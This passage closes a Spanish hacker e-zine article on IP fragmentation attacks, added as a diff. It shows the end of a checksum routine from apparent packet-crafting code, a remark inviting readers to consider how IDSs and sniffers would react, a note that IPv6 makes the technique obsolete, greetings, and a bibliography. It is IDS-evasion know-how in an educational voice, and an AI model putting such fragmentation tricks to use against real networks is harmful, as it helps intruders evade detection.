+         * all the carry bits from the top 16 bits into the lower 16 bits.
+         */
+
+        sum = 0;
+        while (nbytes > 1)  
+        {
+              sum += *ptr++;
+              nbytes -= 2;
+        }
+       
+        /* mop up an odd byte, if necessary */
+        if (nbytes == 1) 
+        {
+              oddbyte = 0;            /* make sure top half is zero */
+              *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
+              sum += oddbyte;
+        }
+        /* 
+         * Add back carry outs from top 16 bits to low 16 bits.
+         */
+         sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
+         sum += (sum >> 16);                     /* add carry */
+         answer = ~sum;          /* ones-complement, then truncate to 16 bits */
+         return(answer);
+}
+
+Bien, bien, bien. Yo lo dejo aqui, pero no permitas que los arboles te impidan
+ver el bosque; al contrario, lo que pretendo es abrirte los ojos. Como crees
+reacionaran los programas de analisis de trafico tcp/ip ante esto? Y los
+sniffers? Y los IDS's? (duh?) ;). Suerte!
+
+
+5.- Prevision de futuro
+^^^^^^^^^^^^^^^^^^^^^^^
+
+El futuro que tienen los ataques basados en fragmentacion de IP tal y como los
+he explicado aqui, es el mismo que tiene el IPv4. En el momento que se
+complete el paso a IPv6 no tendran ningun sentido.
+
+Solo como apunte, dire que en el IPv6 la forma de tratar el problema de MTU's
+mas peque¤as se soluciona de diferente manera (aunque sigue siendo con
+fragmentacion). La fragmentacion de datagramas nunca se producira ya en los
+host intermedios, sino que cuando un datagrama llegue a una red que no pueda
+atravesar (por tener una MTU menor que su tama¤o), enviara un ICMP al host
+origen indicandole que tiene que fragmentarse y tambien 'el tama¤o que deben
+tener esos fragmentos' (es decir, el MTU de esa red). Sera entonces el host
+origen el encargado de enviar los fragmentos (y sucesivos datagramas) con el
+tama¤o adecuado.
+
+Todos los fragmentos que lleguen a un host destino seran, por lo tanto, de
+tama¤o igual a su MTU (excepto quizas el ultimo).
+
+La seguridad de este metodo?? Pues con el tiempo se vera...
+
+
+Nada mas. Saludos a Marconi y demas gente de El_Liceo, a MORTIIZ, AiNaKeR,
+Ripe, Anarion, Jafar, mnm y resto de pe¤a del canal #root ;].
+
+
+6.- Bibliografia
+^^^^^^^^^^^^^^^^
+
+[1] - "Internet Protocol", RFC791, 1981.
+
+[2] - "Security Considerations for IP Fragment Filtering", RFC1858, 1995.
+
+[3] - "Computer Networks", 3¦ edicion, Andrew S. Tanenbaum, 1996.
+
+[4] - "Internetworking with TCP/IP", volumen I, 3¦ edicion, Douglas E. Comer.
+
+[5] - "Internet Protocol, Version 6 (IPv6)", RFC1883, 1995.
+
+[6] - "Packet Fragmentation Attacks", Dr. Cohen.
+
+[7] - "Trabajo sobre TCP/IP", formato .hlp, alibaba.
+
+-=(EOF)=-
+
